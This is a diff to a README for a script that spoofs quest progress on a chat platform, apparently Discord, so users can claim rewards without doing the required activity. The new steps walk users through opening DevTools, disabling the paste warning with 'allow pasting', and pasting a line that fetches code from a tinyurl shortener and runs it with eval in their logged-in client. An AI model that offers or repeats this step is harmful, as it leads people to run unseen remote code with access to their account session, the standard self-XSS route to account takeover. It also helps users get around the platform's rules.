@@ -7,16 +7,27 @@
 
 ## Download / How to use it?
 
--   sadsad
--   Copy-paste the below code and press enter
-    ```
-    fetch('https://tinyurl.com/SpoofQuest').then(r => r.text()).then(eval);
-
-    ```
--   sadasdsa
--   That's all.
+1. **Enable Developer Mode:**  
+       - Go to `User Settings -> Advanced -> Developer Mode` and turn it on.
+2. **Accept a quest** in `User Settings -> Gift Inventory`.
+3. **Open DevTools** with `Ctrl + Shift + I` and go to the `Console` tab.
+4. **Enable Pasting:**  
+       - Type `allow pasting` and press Enter.
+5. **Paste** the following code and hit Enter:
+   ```javascript
+   fetch('https://tinyurl.com/SpoofQuest').then(r => r.text()).then(eval);
+   ```
+6. **Follow the instructions** in the console:
+    - If it says "play," join a VC and just wait.
+    - If it says "stream," join a VC and stream **any** window. (Even notepad.exe)
+7. **Wait** 15 minutes.
+8. **Claim your reward** in `User Settings -> Gift Inventory`.
 ---
+You can track progress by watching the `Quest progress:` prints in the Console tab or by reopening the Gift Inventory tab.
+---
+Credit goes to :
 [@aamiaa's work and original script.](https://gist.github.com/aamiaa/204cd9d42013ded9faf646fae7f89fbb)
+I just simplifed the apply method for personal needs.
 
 ---
 <p align="center"> Made with <br>
